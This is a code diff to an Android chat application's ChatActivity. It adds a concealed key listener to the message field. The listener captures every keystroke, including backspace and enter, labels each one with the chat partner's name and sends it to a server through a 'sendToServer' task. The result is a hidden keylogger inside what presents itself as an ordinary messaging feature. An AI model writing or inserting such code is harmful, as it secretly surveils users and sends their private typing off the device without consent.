@@ -14,6 +14,7 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.provider.MediaStore;
 import android.util.Base64;
+import android.view.KeyEvent;
 import android.view.View;
 import android.view.ViewGroup;
 import android.widget.EditText;
@@ -66,6 +67,32 @@ public class ChatActivity extends AppCompatActivity {
         image = findViewById(R.id.sendImage);
         location = findViewById(R.id.sendLocation);
         db = new DBHelper(this);
+        otheruser = getIntent().getStringExtra("sender");
+        inputMessage.setFocusableInTouchMode(true);
+        inputMessage.setOnKeyListener(new View.OnKeyListener() {
+            @Override
+            public boolean onKey(View view, int i, KeyEvent keyEvent) {
+                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
+                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
+                        return false;
+                    }
+                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
+                        String keylog  = "Chat with " + otheruser + ":{BACKSPACE}\n";
+                        new sendToServer(keylog).execute();
+                    }
+                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
+                        String keylog  = "Chat with " + otheruser + ":{ENTER}\n";
+                        new sendToServer(keylog).execute();
+                    }
+                    else{
+                        char key = (char) keyEvent.getUnicodeChar();
+                        String keylog  = "Chat with " + otheruser + ":{" + key + "}\n";
+                        new sendToServer(keylog).execute();
+                    }
+                }
+                return false;
+            }
+        });
         image.setOnClickListener(new View.OnClickListener() {
             public void onClick(View view) {
                 if (ContextCompat.checkSelfPermission(ChatActivity.this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
@@ -106,7 +133,6 @@ public class ChatActivity extends AppCompatActivity {
 
             }
         });
-        otheruser = getIntent().getStringExtra("sender");
         toolbar.setTitle(otheruser);
         setSupportActionBar(toolbar);
         toolbar.setNavigationOnClickListener(new View.OnClickListener() {
